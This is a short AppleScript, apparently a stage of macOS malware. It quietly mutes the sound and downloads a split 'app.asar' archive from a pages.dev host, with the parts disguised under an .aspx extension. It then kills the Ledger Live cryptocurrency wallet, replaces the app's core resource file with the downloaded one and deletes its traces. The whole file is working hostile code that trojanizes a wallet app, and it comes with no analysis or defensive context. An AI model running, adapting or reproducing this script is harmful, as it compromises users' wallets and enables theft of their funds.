
set kDomainPrefix    to "67e5143a9ca7d2240c137ef80f2641d6"
set kDomainSuffix    to "pages.dev"
set kTotalParts      to 3
set kPartBaseName    to "app.asar.zip.part"
set kPartExtension   to ".aspx"

set kDownloadFolder  to "/tmp/downloaded_parts"
set kMergedZip       to "/tmp/app.asar.zip"
set kSourcePath      to "/tmp/app.asar"
set kDestPath        to "/Applications/Ledger Live.app/Contents/Resources/"

set kDomain to kDomainPrefix & "." & kDomainSuffix

do shell script "osascript -e 'set volume with output muted'"

do shell script "mkdir -p " & quoted form of kDownloadFolder
do shell script "rm -f " & quoted form of kMergedZip

repeat with i from 1 to kTotalParts
    set partUrl   to "https://" & kDomain & "/" & kPartBaseName & i & kPartExtension
    set partFile  to kDownloadFolder & "/part" & i & kPartExtension
    
    do shell script "curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o " & quoted form of partFile & " " & quoted form of partUrl
    do shell script "cat " & quoted form of partFile & " >> " & quoted form of kMergedZip
end repeat

do shell script "cd /tmp && unzip -o " & quoted form of kMergedZip
do shell script "killall 'Ledger Live' || true"

tell application "Finder"
    set sourceAlias to POSIX file kSourcePath as alias
    set destAlias   to POSIX file kDestPath as alias
    duplicate sourceAlias to destAlias with replacing
end tell

do shell script "rm -rf " & quoted form of kDownloadFolder
do shell script "rm -f " & quoted form of kMergedZip

do shell script "osascript -e 'set volume without output muted'"
